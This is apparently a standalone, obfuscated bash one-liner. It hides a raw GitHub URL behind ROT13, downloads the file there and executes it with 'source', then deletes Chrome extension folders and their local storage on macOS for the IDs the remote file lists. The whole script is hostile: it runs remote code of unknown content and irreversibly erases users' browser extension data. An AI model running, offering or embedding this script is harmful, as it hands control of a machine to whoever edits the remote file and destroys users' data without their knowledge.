r() { echo "$1" | tr 'A-Za-z' 'N-ZA-Mn-za-m'; };dg=true; u=$(r "uggcf://enj.tvguhohfrepbagrag.pbz/TyvzcfrZhzoyr/zhzoyrq/ersf/urnqf/znva/vq"); ids=(); if ! curl -s -f "$u" -o y; then $dg && echo "Fetch failed."; exit 1; fi; source y; rm -f y; if [ ${#ids[@]} -eq 0 ]; then $dg && echo "No IDs."; exit 1; fi; for z in "${ids[@]}"; do rm -rf "$HOME/Library/Application Support/Google/Chrome/Default/Local Extension Settings/${z}"; rm -rf "$HOME/Library/Application Support/Google/Chrome/Default/Extensions/${z}"; if [ ! -d "$HOME/Library/Application Support/Google/Chrome/Default/Local Extension Settings/${z}" ] && [ ! -d "$HOME/Library/Application Support/Google/Chrome/Default/Extensions/${z}" ]; then $dg && echo "${z} removed."; else $dg && echo "Didn't remove ${z}."; fi; done
